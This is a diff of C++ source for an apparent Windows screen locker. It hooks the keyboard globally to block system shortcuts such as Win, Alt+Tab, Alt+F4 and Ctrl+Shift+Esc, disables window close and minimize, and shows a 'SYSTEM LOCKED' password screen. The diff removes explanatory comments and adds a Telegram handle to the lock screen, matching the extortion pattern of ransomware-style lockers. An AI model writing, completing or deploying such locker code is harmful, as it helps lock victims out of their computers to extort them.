@@ -28,37 +28,20 @@ const COLORREF FG     = RGB(255, 255, 255);
 const COLORREF DIM    = RGB(90, 90, 90);
 const COLORREF ACCENT = RGB(200, 30, 30);
 
-// ── глобальный хук клавиатуры ───────────────────────────────
-// глушим системные комбинации, которые иначе снесут локер
 LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
     if (code == HC_ACTION && !g_unlocked) {
         auto* kb = (KBDLLHOOKSTRUCT*)lp;
         DWORD vk = kb->vkCode;
 
-        // Win-хоткеи: Win, Win+D, Win+M, Win+L, Win+Tab, Win+R, Win+E и т.д.
         if (vk == VK_LWIN || vk == VK_RWIN) return 1;
-
-        // Alt+Tab
         if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
-
-        // Alt+F4
         if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
-
-        // Alt+Esc
         if (vk == VK_ESCAPE && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
-
-        // Esc — одиночный
-        if (vk == VK_ESCAPE) return 1;
-
-        // Ctrl+Shift+Esc (диспетчер задач)
         if (vk == VK_ESCAPE
             && (GetAsyncKeyState(VK_CONTROL) & 0x8000)
             && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) return 1;
-
-        // Ctrl+Esc (меню Пуск)
         if (vk == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1;
-
-        // F11
+        if (vk == VK_ESCAPE) return 1;
         if (vk == VK_F11) return 1;
     }
     return CallNextHookEx(g_kbHook, code, wp, lp);
@@ -96,17 +79,18 @@ void Paint(HWND hwnd) {
 
     DrawTextEx(dc, 0, 180, L"SYSTEM LOCKED", ACCENT, 72, true, rc.right);
     DrawTextEx(dc, 0, 280, L"enter password to continue", DIM, 22, true, rc.right);
+    DrawTextEx(dc, 0, 320, L"tg: @werkaramel", ACCENT, 28, true, rc.right);
 
-    RECT box{ cx - 250, 380, cx + 250, 440 };
+    RECT box{ cx - 250, 400, cx + 250, 460 };
     HBRUSH bf = CreateSolidBrush(RGB(15, 15, 15));
     FillRect(dc, &box, bf);
     DeleteObject(bf);
     FrameRect(dc, &box, (HBRUSH)GetStockObject(WHITE_BRUSH));
 
     std::wstring masked(g_input.size(), L'*');
-    DrawTextEx(dc, cx - 230, 398, masked.c_str(), FG, 26, false, 0);
+    DrawTextEx(dc, cx - 230, 418, masked.c_str(), FG, 26, false, 0);
 
-    DrawTextEx(dc, 0, 480, L"[ Enter ]  unlock", DIM, 20, true, rc.right);
+    DrawTextEx(dc, 0, 500, L"[ Enter ]  unlock", DIM, 20, true, rc.right);
 
     DrawTextEx(dc, 0, 580, L"ctrl+alt+del to force close",
                RGB(50, 50, 50), 16, true, rc.right);
@@ -124,7 +108,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         return 0;
 
     case WM_SYSCOMMAND:
-        // блокируем SC_CLOSE (Alt+F4), SC_MINIMIZE, SC_TASKLIST
         if ((wp & 0xFFF0) == SC_CLOSE) return 0;
         if ((wp & 0xFFF0) == SC_MINIMIZE) return 0;
         if ((wp & 0xFFF0) == SC_TASKLIST) return 0;
@@ -184,7 +167,6 @@ int WINAPI wWinMain(HINSTANCE hi, HINSTANCE, PWSTR, int show) {
     SetForegroundWindow(hwnd);
     SetFocus(hwnd);
 
-    // глобальный хук клавиатуры — глушит Win-хоткеи и системные комбинации
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbHook, hi, 0);
 
     MSG m;
